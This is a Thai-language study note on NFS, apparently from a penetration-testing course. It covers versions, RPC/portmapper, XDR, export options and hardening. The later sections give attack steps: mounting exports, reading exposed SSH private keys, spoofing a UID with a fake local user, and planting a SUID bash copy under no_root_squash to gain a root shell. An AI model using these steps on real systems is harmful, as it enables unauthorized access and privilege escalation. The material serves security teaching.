# Network File System (NFS)


**NFS** (`Network File System`) คือระบบไฟล์เครือข่ายที่พัฒนาโดย Sun Microsystems มีจุดประสงค์คล้ายกับ SMB คือ ทำให้เราสามารถเข้าถึงไฟล์ในเครือข่ายได้เหมือนกับไฟล์ที่อยู่ในเครื่องของเราเอง แต่ใช้โปรโตคอลที่ต่างกันโดยสิ้นเชิง

- **ใช้กับระบบไหน**: Linux และ Unix (ไม่ใช่ Windows โดยตรง)
- **ข้อจำกัด**: เครื่อง NFS ไม่สามารถสื่อสารกับเซิร์ฟเวอร์ SMB ได้โดยตรง

## ความแตกต่างของแต่ละเวอร์ชัน

### การยืนยันตัวตน (Authentication)
- **NFSv3**: ยืนยันตัวตนที่ระดับ**เครื่องคอมพิวเตอร์**
```
เครื่อง A (10.129.14.50):
  - User "admin" login → เข้า NFS ได้ (rw) ✅
  - User "guest" login → เข้า NFS ได้ (rw) ✅
  - User "hacker" login → เข้า NFS ได้ (rw) ✅
  
  ทุกคนบนเครื่องเดียวกันได้สิทธิ์เท่ากัน!
```

### ปัญหา ❌
- **ไม่รู้ว่าใครกำลังใช้งาน** เพียงแค่รู้ว่ามาจากเครื่องไหน
- ถ้ามีคนแอบใช้เครื่องที่ได้รับอนุญาต = เข้าได้ทันที
- ไม่สามารถควบคุมสิทธิ์แยกตามผู้ใช้ได้
---
- **NFSv4**: ยืนยันตัวตนที่ระดับ**ผู้ใช้** (เหมือน Windows SMB)


```
เครื่อง A (10.129.14.50):
  - User "admin" → ต้อง login ด้วย Kerberos ก่อน
    → ถ้าผ่าน: เข้า NFS ได้ ✅
    
  - User "guest" → ต้อง login ด้วย Kerberos ก่อน
    → ถ้าไม่มีสิทธิ์: เข้าไม่ได้ ❌
    
  - User "hacker" → แม้จะอยู่บนเครื่องเดียวกัน
    → ถ้าไม่มี credential: เข้าไม่ได้ ❌
```

### ข้อดี ✅
- **รู้แน่ชัดว่าใครกำลังใช้งาน**
- สามารถกำหนดสิทธิ์แยกตามแต่ละคนได้
- ปลอดภัยกว่ามาก



---

### เปรียบเทียบเวอร์ชัน

| เวอร์ชัน | คุณสมบัติเด่น |
|---------|--------------|
| **NFSv2** | - เวอร์ชันเก่าแต่รองรับหลายระบบ<br>- ใช้ผ่าน UDP เท่านั้น |
| **NFSv3** | - มีฟีเจอร์เพิ่มขึ้น เช่น ขนาดไฟล์ที่ยืดหยุ่นกว่า<br>- รายงานข้อผิดพลาดได้ดีขึ้น<br>- แต่ใช้งานร่วมกับ NFSv2 ไม่ได้อย่างสมบูรณ์ |
| **NFSv4** | - รองรับ Kerberos (ระบบความปลอดภัย)<br>- ทำงานผ่าน firewall และอินเทอร์เน็ตได้<br>- ไม่ต้องใช้ portmapper อีกต่อไป<br>- รองรับ ACLs (การควบคุมสิทธิ์ขั้นสูง)<br>- ปลอดภัยและทำงานได้เร็วขึ้น<br>- เป็นเวอร์ชันแรกที่มี stateful protocol |

### NFSv4.1 (RFC 8881)
- รองรับการทำงานแบบคลัสเตอร์
- รองรับ **pNFS** (parallel NFS) สามารถเข้าถึงไฟล์จากหลายเซิร์ฟเวอร์พร้อมกันได้
- มี **session trunking** หรือ NFS multipathing (สามารถใช้หลายเส้นทางเครือข่ายพร้อมกัน)

### ข้อดีสำคัญของ NFSv4
ใช้เพียง**พอร์ตเดียว** (`2049`) ไม่ว่าจะเป็น UDP หรือ TCP ทำให้ผ่าน firewall ได้ง่ายขึ้น

## เทคโนโลยีพื้นฐาน

NFS ทำงานบนพื้นฐานของ **ONC-RPC/SUN-RPC** protocol ซึ่ง:
- ใช้พอร์ต `111` (TCP และ UDP)
- ใช้ **XDR** (External Data Representation) เพื่อแลกเปลี่ยนข้อมูลระหว่างระบบที่แตกต่างกัน


### NFS ไม่มีระบบยืนยันตัวตนในตัว!
- NFS protocol **ไม่มี**กระบวนการ**ยืนยันตัวตน** (authentication) หรือ**การอนุญาต** (authorization) ในตัวเอง
- การยืนยันตัวตนถูกโยนไปให้ RPC protocol จัดการแทน
- เซิร์ฟเวอร์จะแปลงข้อมูลผู้ใช้ให้เป็นรูปแบบที่ระบบไฟล์เข้าใจได้

### วิธีการยืนยันตัวตนทั่วไป
ใช้ **UNIX UID/GID** และ **group memberships**

### ปัญหาด้านความปลอดภัย
- **เครื่อง client และ server อาจมีการจับคู่ UID/GID กับผู้ใช้ที่ไม่เหมือนกัน**
- Server **ไม่สามารถตรวจสอบเพิ่มเติมได้**
- ไม่มีการยืนยันความถูกต้องเพิ่มเติมจากฝั่ง server

# อธิบาย ONC-RPC/SUN-RPC และ XDR

## NFS ทำงานอย่างไร?

NFS ไม่ได้ทำงานเพียงลำพัง แต่ต้องอาศัย**ระบบพื้นฐาน**หลายตัวช่วย

```
┌─────────────────────────────────────┐
│         NFS Protocol                │  ← สิ่งที่เราใช้
├─────────────────────────────────────┤
│      RPC (Remote Procedure Call)    │  ← ระบบเรียกใช้งานระยะไกล
├─────────────────────────────────────┤
│      XDR (Data Format)              │  ← รูปแบบข้อมูล
├─────────────────────────────────────┤
│      TCP/UDP                        │  ← เครือข่าย
└─────────────────────────────────────┘
```

---

## 1. **ONC-RPC / SUN-RPC** คือระบบเรียกใช้ฟังก์ชันระยะไกล

### RPC = Remote Procedure Call

**แนวคิด:** เรียกใช้ฟังก์ชันบนเครื่องอื่นเหมือนเรียกใช้ในเครื่องตัวเอง

```
┌──────────────┐                    ┌──────────────┐
│   CLIENT     │                    │   SERVER     │
├──────────────┤                    ├──────────────┤
│              │  1. เรียกฟังก์ชัน │              │
│ read_file()  │ ─────────────────> │              │
│              │                    │ read_file()  │
│              │  2. ส่งผลลัพธ์กลับ│ {รันจริงๆ}   │
│              │ <───────────────── │              │
│ ได้ข้อมูล!  │                    │              │
└──────────────┘                    └──────────────┘
```

### ทำไมเรียกว่า ONC-RPC หรือ SUN-RPC?

- **ONC-RPC** = Open Network Computing RPC (ชื่อมาตรฐาน)
- **SUN-RPC** = ชื่อเดิมที่ Sun Microsystems พัฒนา
- **เป็นตัวเดียวกัน** แค่เรียกชื่อต่างกัน

---

## 2. **พอร์ต 111** - Portmapper/rpcbind

### Portmapper คืออะไร?

เปรียบเทียบกับ**แผนกต้อนรับ**ในบริษัท

```
Client: "ขอใช้บริการ NFS หน่อย"
              ↓
      Portmapper (พอร์ต 111)
      "NFS อยู่ที่พอร์ต 2049 นะครับ"
              ↓
Client เชื่อมต่อไปที่พอร์ต 2049
```

### การทำงานจริง:

```bash
# ดูว่า RPC services ทำงานที่พอร์ตไหนบ้าง
$ rpcinfo -p
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100003    3   tcp   2049  nfs
    100005    3   tcp  20048  mountd
    100021    4   tcp  37521  nlockmgr
```

**อธิบาย:**
- **portmapper** (พอร์ต 111) = ตัวจัดการหลัก
- **nfs** (พอร์ต 2049) = บริการ NFS จริงๆ
- **mountd** (พอร์ต 20048) = จัดการการ mount
- **nlockmgr** (พอร์ต 37521) = จัดการ file locking

### ขั้นตอนการเชื่อมต่อ:

```
1. Client → Server พอร์ต 111
   "ขอถามหน่อย NFS อยู่พอร์ตไหน?"

2. Portmapper ตอบกลับ
   "NFS อยู่พอร์ต 2049"

3. Client → Server พอร์ต 2049
   "ขอเชื่อมต่อ NFS เลย"

4. ใช้งาน NFS ได้
```

---

## 3. **XDR** (External Data Representation)

### ปัญหาที่ XDR แก้ไข

เครื่องคอมพิวเตอร์แต่ละเครื่อง**เก็บข้อมูลต่างกัน**!

### ตัวอย่าง: เก็บเลข 12345

**Little Endian** (Intel, AMD):
```
หน่วยความจำ:  [39] [30] [00] [00]
               ↑ เก็บ byte ต่ำก่อน
```

**Big Endian** (บาง CPU):
```
หน่วยความจำ:  [00] [00] [30] [39]
               ↑ เก็บ byte สูงก่อน
```

**ถ้าไม่แปลง = ข้อมูลผิด!**

---

### XDR ทำหน้าที่แปลงข้อมูล

```
┌──────────────┐                    ┌──────────────┐
│   CLIENT     │                    │   SERVER     │
│ (Intel CPU)  │                    │  (ARM CPU)   │
├──────────────┤                    ├──────────────┤
│              │                    │              │
│ 12345        │  1. แปลงเป็น XDR  │              │
│ [39][30]...  │ ─────────────────> │              │
│              │  XDR: มาตรฐานกลาง │              │
│              │                    │ 2. แปลงเป็น  │
│              │                    │    รูปแบบของ │
│              │                    │    Server     │
│              │  3. ส่งผลลัพธ์กลับ│ 12345        │
│              │ <───────────────── │              │
└──────────────┘                    └──────────────┘
```

### XDR แปลงอะไรบ้าง?

| ประเภทข้อมูล | การแปลง |
|-------------|---------|
| **จำนวนเต็ม** | เปลี่ยนจาก Little/Big Endian เป็นมาตรฐาน |
| **ทศนิยม** | แปลง floating-point ให้เหมือนกัน |
| **ข้อความ** | จัดการ encoding และขนาด |
| **โครงสร้างข้อมูล** | แปลง struct/array ให้เข้าใจกันได้ |

---

## ตัวอย่างการทำงานทั้งหมด

### สถานการณ์: Client ต้องการอ่านไฟล์จาก NFS Server

```
┌─────────────────────────────────────────────────────────┐
│ ขั้นตอนที่ 1: หา NFS Service                           │
└─────────────────────────────────────────────────────────┘

Client ──[ถาม: NFS อยู่ไหน?]──> Server พอร์ต 111 (Portmapper)
Client <──[ตอบ: พอร์ต 2049]──── Server


┌─────────────────────────────────────────────────────────┐
│ ขั้นตอนที่ 2: เรียกใช้ RPC - ขอ mount                   │
└─────────────────────────────────────────────────────────┘

Client ──[RPC: mount /mnt/nfs]──> Server พอร์ต 2049
       │                          │
       │ ข้อมูลถูกแปลงด้วย XDR   │
       │                          ↓
       │                      ตรวจสอบสิทธิ์
       │                      mount ได้หรือไม่?
       │                          │
Client <──[RPC Reply: OK]──────── Server


┌─────────────────────────────────────────────────────────┐
│ ขั้นตอนที่ 3: อ่านไฟล์                                  │
└─────────────────────────────────────────────────────────┘

Client ──[RPC: read file.txt]──> Server
       │ UID=1000                │
       │ GID=1000                │
       │ XDR Format              ↓
       │                     เช็คสิทธิ์ UID/GID
       │                     อ่านไฟล์
       │                         │
Client <──[RPC Reply: data]────  Server
       ↓
   ได้ข้อมูลแล้ว!
   แปลง XDR กลับเป็นข้อมูลปกติ
```

---

## การตรวจสอบ RPC Services

### คำสั่งที่ใช้บ่อย:

```bash
# 1. ดู RPC services ทั้งหมด
$ rpcinfo -p 10.129.14.5
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100003    3   tcp   2049  nfs
    100005    3   tcp  20048  mountd

# 2. ดูว่า NFS แชร์โฟลเดอร์อะไรบ้าง
$ showmount -e 10.129.14.5
Export list for 10.129.14.5:
/mnt/nfs 10.129.14.0/24

# 3. สแกนพอร์ต RPC ด้วย nmap
$ nmap -sV -p 111 10.129.14.5
PORT    STATE SERVICE VERSION
111/tcp open  rpcbind 2-4 (RPC #100000)
```

---

## ทำไมต้องรู้เรื่องนี้?

### เพื่อความปลอดภัย! 🔒

**จุดอ่อน:**

1. **พอร์ต 111 เปิดอยู่ = เปิดเผยข้อมูล**
   ```bash
   # ใครก็ตามสามารถถามได้ว่ามี service อะไรทำงานบ้าง
   $ rpcinfo -p target.com
   # ได้ข้อมูลทั้งหมด!
   ```

2. **RPC ไม่มีการเข้ารหัส**
   ```
   ข้อมูลถูกส่งแบบ plain text!
   ใครก็ดักจับได้ (sniff network traffic)
   ```

3. **ไม่มีการยืนยันตัวตนที่แข็งแกร่ง**
   ```
   ใช้แค่ UID/GID ซึ่งปลอมได้ง่าย
   ```

### วิธีป้องกัน:

✅ **ปิดพอร์ต 111 จากภายนอก** (ใช้ firewall)
✅ **ใช้ NFSv4** (ไม่ต้องพึ่ง portmapper)
✅ **ใช้ VPN หรือ SSH Tunnel** (เข้ารหัสการสื่อสาร)
✅ **ใช้เฉพาะในเครือข่ายภายใน** (trusted network)

---

## สรุป

### ONC-RPC/SUN-RPC:
- เป็น**ระบบเรียกใช้ฟังก์ชันระยะไกล**
- NFS ใช้ RPC เป็นพื้นฐานในการสื่อสาร
- ใช้**พอร์ต 111** สำหรับ Portmapper (บอกว่า service อยู่พอร์ตไหน)

### XDR:
- เป็น**รูปแบบข้อมูลมาตรฐาน**
- แปลงข้อมูลระหว่างเครื่องที่มี architecture ต่างกัน
- ทำให้เครื่อง Intel สื่อสารกับ ARM ได้

### เปรียบเทียบง่ายๆ:
```
RPC    = ระบบโทรศัพท์ (โทรไปเรียกใช้ฟังก์ชัน)
XDR    = ล่าม (แปลภาษาให้เข้าใจกัน)
พอร์ต 111 = แผนกต้อนรับ (บอกว่าแต่ละแผนกอยู่ไหน)
```

### จุดอ่อนด้านความปลอดภัย:
- ข้อมูลไม่เข้ารหัส
- พอร์ต 111 เปิดเผยข้อมูล service
- ง่ายต่อการโจมตี

# แปลไทยแบบเข้าใจง่าย: การสแกนและใช้งาน NFS

## 🔍 การสแกนหา NFS Service (Footprinting)

### พอร์ตสำคัญ
- **พอร์ต 111** = RPC (rpcbind)
- **พอร์ต 2049** = NFS

---


## การตั้งค่าพื้นฐาน

NFS ตั้งค่าไม่ยากเพราะมีตัวเลือกไม่เยอะเท่า FTP หรือ SMB 

### ไฟล์หลัก: `/etc/exports`

ไฟล์นี้เป็นเหมือน **"รายชื่อแขก"** ที่บอกว่า:
- โฟลเดอร์ไหนในเซิร์ฟเวอร์จะแชร์ให้ใครได้บ้าง
- แต่ละคนมีสิทธิ์อะไรบ้าง

**ตัวอย่างไฟล์ `/etc/exports`:**
```bash
# ตัวอย่างสำหรับ NFSv2 และ NFSv3:
# /srv/homes  hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)

# ตัวอย่างสำหรับ NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
```

### รูปแบบการตั้งค่า

```
/path/to/folder    IP_หรือ_subnet(options)
```

**ตัวอย่าง:**
```
/mnt/nfs    10.129.14.0/24(sync,no_subtree_check)
```

**แปลว่า:** แชร์โฟลเดอร์ `/mnt/nfs` ให้กับทุกเครื่องในเครือข่าย `10.129.14.0/24`

---

## ตัวเลือก (Options) ที่สำคัญ

### ตัวเลือกทั่วไป

| ตัวเลือก | คำอธิบาย |
|---------|----------|
| **rw** | อ่านและเขียนได้ (Read & Write) |
| **ro** | อ่านอย่างเดียว (Read Only) |
| **sync** | ถ่ายโอนข้อมูลแบบ synchronous (ช้ากว่าแต่ปลอดภัย - เขียนเสร็จแน่นอนก่อนตอบกลับ) |
| **async** | ถ่ายโอนข้อมูลแบบ asynchronous (เร็วกว่าแต่เสี่ยง - ตอบกลับก่อนเขียนเสร็จ) |
| **secure** | ใช้เฉพาะพอร์ตที่ต่ำกว่า 1024 (ปลอดภัย) |
| **insecure** | ใช้พอร์ตสูงกว่า 1024 ได้ (ไม่ปลอดภัย) |
| **no_subtree_check** | ปิดการตรวจสอบโฟลเดอร์ย่อย (เร็วขึ้นแต่อาจมีปัญหาความปลอดภัย) |
| **root_squash** | แปลงสิทธิ์ root เป็น anonymous user (ป้องกันไม่ให้ root จาก client เข้าถึงไฟล์แบบ root) |

---

## ตัวอย่างการตั้งค่า

```bash
# เพิ่มการแชร์โฟลเดอร์
root@nfs:~# echo '/mnt/nfs  10.129.14.0/24(sync,no_subtree_check)' >> /etc/exports

# รีสตาร์ท NFS service
root@nfs:~# systemctl restart nfs-kernel-server 

# ตรวจสอบว่าแชร์อะไรบ้าง
root@nfs:~# exportfs

/mnt/nfs      	10.129.14.0/24
```

**ผลลัพธ์:** โฟลเดอร์ `/mnt/nfs` ถูกแชร์ให้กับทุกเครื่องในเครือข่าย `10.129.14.0/24` แล้ว

---

## ⚠️ การตั้งค่าที่อันตราย (Dangerous Settings)

### ตัวเลือกที่ต้องระวัง

| ตัวเลือก | ทำไมอันตราย? |
|---------|-------------|
| **rw** | ให้สิทธิ์เขียนได้ → ถ้าตั้งค่าผิด คนอื่นแก้ไขหรือลบไฟล์ได้ |
| **insecure** | อนุญาตให้ใช้พอร์ตสูงกว่า 1024 → user ทั่วไปสามารถเชื่อมต่อได้ (ไม่จำกัดแค่ root) |
| **nohide** | แสดง filesystem ที่ mount ซ้อนกัน → เปิดเผยโครงสร้างโฟลเดอร์มากเกินไป |
| **no_root_squash** | **อันตรายมาก!** root จาก client มีสิทธิ์ root เต็มที่บนเซิร์ฟเวอร์ → สามารถทำอะไรก็ได้! |

---

## อธิบายความอันตรายของแต่ละตัวเลือก

### 1. **insecure** - ทำไมอันตราย?

**ความรู้พื้นฐาน:**
- พอร์ต 1-1024 = **Privileged ports** (ใช้ได้เฉพาะ root เท่านั้น)
- พอร์ต 1025-65535 = ใครก็ใช้ได้

**ปกติ (secure):**
```
✅ เฉพาะ root เท่านั้นที่เชื่อมต่อ NFS ได้
   เพราะต้องใช้พอร์ตต่ำกว่า 1024
```

**ถ้าตั้ง insecure:**
```
❌ user ธรรมดาก็เชื่อมต่อ NFS ได้
   เพราะใช้พอร์ตสูงกว่า 1024 ได้
```

### 2. **no_root_squash** - อันตรายที่สุด! 💀

**ปกติ (root_squash - ค่า default):**
```
Client: ฉันเป็น root นะ!
Server: ไม่สนใจ! เปลี่ยนเป็น anonymous user ให้เลย
        ไฟล์ที่สร้างจะเป็นของ nobody:nogroup
```

**ถ้าตั้ง no_root_squash:**
```
Client: ฉันเป็น root นะ!
Server: ได้เลยครับ มีสิทธิ์ root เต็มที่เลย!
        ทำอะไรก็ได้ ลบอะไรก็ได้! 😱
```

**ตัวอย่างการโจมตี:**
```bash
# Hacker mount NFS share ที่มี no_root_squash
mount -t nfs 10.129.14.5:/mnt/nfs /tmp/mount

# สร้างไฟล์ที่มี setuid bit (ทำให้รันด้วยสิทธิ์ root)
cp /bin/bash /tmp/mount/bash
chmod +s /tmp/mount/bash

# ตอนนี้ hacker มี root shell แล้ว!
```

---



### ควรตั้งค่าแบบนี้:
```bash
/mnt/nfs  10.129.14.0/24(ro,sync,no_subtree_check,root_squash,secure)
```

- **ro** = อ่านอย่างเดียว ปลอดภัยกว่า
- **sync** = ข้อมูลไม่สูญหาย
- **root_squash** = ป้องกัน root จาก client
- **secure** = เฉพาะ root เชื่อมต่อได้

### ไม่ควรตั้งแบบนี้:
```bash
/mnt/nfs  *(rw,async,insecure,no_root_squash,nohide)  # อันตราย! 💥
```



##  สแกนด้วย Nmap Scripts (NSE) แบบละเอียด

```bash
sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049
```

### ข้อมูลที่ได้เพิ่มเติม:

#### 📁 **nfs-ls**: แสดงไฟล์ในโฟลเดอร์ที่แชร์
```
Volume /mnt/nfs
  access: Read Lookup NoModify NoExtend NoDelete NoExecute
  
PERMISSION  UID    GID    SIZE  TIME                 FILENAME
rwxrwxrwx   65534  65534  4096  2021-09-19T15:28:17  .
rw-r--r--   0      0      1872  2021-09-19T15:27:42  id_rsa
rw-r--r--   0      0      348   2021-09-19T15:28:17  id_rsa.pub
rw-r--r--   0      0      0     2021-09-19T15:22:30  nfs.share
```

**วิเคราะห์:**
- เจอไฟล์ `id_rsa` และ `id_rsa.pub` → SSH private/public keys! 🔑
- UID 0 = root เป็นเจ้าของไฟล์
- สิทธิ์ `rw-r--r--` = root เขียนได้, คนอื่นอ่านอย่างเดียว

#### 🗺️ **nfs-showmount**: แสดงว่าแชร์ให้ใคร
```
/mnt/nfs 10.129.14.0/24
```
แชร์ให้กับทั้งเครือข่าย `10.129.14.0/24`


## 3. ตรวจสอบ NFS Shares ที่มีอยู่

```bash
showmount -e 10.129.14.128
```

**ผลลัพธ์:**
```
Export list for 10.129.14.128:
/mnt/nfs 10.129.14.0/24
```

**แปลว่า:** เซิร์ฟเวอร์แชร์โฟลเดอร์ `/mnt/nfs` ให้เครือข่าย `10.129.14.0/24`

---

## 4. Mount NFS Share เข้ามาในเครื่องเรา

### ขั้นตอน:

```bash
# 1. สร้างโฟลเดอร์เปล่าสำหรับ mount
mkdir target-NFS

# 2. Mount NFS share
sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock

# 3. เข้าไปดูข้างใน
cd target-NFS

# 4. ดูโครงสร้างโฟลเดอร์
tree .
```

**ผลลัพธ์:**
```
.
└── mnt
    └── nfs
        ├── id_rsa
        ├── id_rsa.pub
        └── nfs.share

2 directories, 3 files
```

---

## 5. ตรวจสอบสิทธิ์ไฟล์และ User

### ดู Username และ Group Name:
```bash
ls -l mnt/nfs/
```

**ผลลัพธ์:**
```
-rw-r--r-- 1 cry0l1t3 cry0l1t3 1872 Sep 25 00:55 cry0l1t3.priv
-rw-r--r-- 1 cry0l1t3 cry0l1t3  348 Sep 25 00:55 cry0l1t3.pub
-rw-r--r-- 1 root     root     1872 Sep 19 17:27 id_rsa
-rw-r--r-- 1 root     root      348 Sep 19 17:28 id_rsa.pub
-rw-r--r-- 1 root     root        0 Sep 19 17:22 nfs.share
```

### ดู UID และ GID:
```bash
ls -n mnt/nfs/
```

**ผลลัพธ์:**
```
-rw-r--r-- 1 1000 1000 1872 Sep 25 00:55 cry0l1t3.priv
-rw-r--r-- 1 1000 1000  348 Sep 25 00:55 cry0l1t3.pub
-rw-r--r-- 1    0 1000 1221 Sep 19 18:21 backup.sh
-rw-r--r-- 1    0    0 1872 Sep 19 17:27 id_rsa
-rw-r--r-- 1    0    0  348 Sep 19 17:28 id_rsa.pub
```

**วิเคราะห์:**
- UID `0` = root
- UID `1000` = user ธรรมดา (มักเป็น user แรกในระบบ)
- GID `1000` = group ของ user นั้น

---

## 🎯 เทคนิคการโจมตี (Privilege Escalation)

### สถานการณ์: เราต้องการอ่านไฟล์ที่เป็นของ user อื่น

**วิธีการ:**

1. **สร้าง user ใหม่ในเครื่องเราที่มี UID/GID เหมือนกับเป้าหมาย**
```bash
# สร้าง user UID 1000 (เหมือนกับ cry0l1t3)
sudo useradd -u 1000 fake_user
sudo su fake_user
```

2. **ตอนนี้เราสามารถอ่าน/แก้ไขไฟล์ของ cry0l1t3 ได้แล้ว!**
```bash
cat mnt/nfs/cry0l1t3.priv  # อ่าน private key ได้!
```

### เทคนิคขั้นสูง: Upload Shell ที่มี SUID

**ถ้า NFS มีการตั้ง `no_root_squash`:**

```bash
# 1. คัดลอก bash ไปที่ NFS share
cp /bin/bash ./target-NFS/mnt/nfs/bash

# 2. ตั้ง SUID bit (ทำให้รันด้วยสิทธิ์เจ้าของไฟล์)
chmod +s ./target-NFS/mnt/nfs/bash

# 3. SSH เข้าไปในเซิร์ฟเวอร์เป้าหมาย แล้วรัน
./bash -p  # จะได้ root shell! 💀
```

---

## ⚠️ ข้อควรระวัง

### ถ้ามี `root_squash` (ค่า default)
```bash
# แม้เราเป็น root ในเครื่องเรา
# แต่จะถูกเปลี่ยนเป็น "nobody" บน NFS server
# ทำให้แก้ไขไฟล์ที่เป็นของ root ไม่ได้
```

**ตัวอย่าง:**
```bash
# พยายามแก้ไข backup.sh (เจ้าของคือ root)
vim mnt/nfs/backup.sh
# จะแก้ไม่ได้! เพราะถูก root_squash
```

---

## 6. Unmount เมื่อเสร็จแล้ว

```bash
cd ..
sudo umount ./target-NFS
```

---

## 📊 สรุปขั้นตอนทั้งหมด

```
1. สแกนหา NFS service
   ↓
2. ตรวจสอบ shares ที่มี (showmount)
   ↓
3. Mount share มาที่เครื่องเรา
   ↓
4. ดู UID/GID ของไฟล์
   ↓
5. สร้าง user ที่มี UID/GID เดียวกัน
   ↓
6. เข้าถึงไฟล์ได้แล้ว! 🎯
   ↓
7. Unmount เมื่อเสร็จ
```

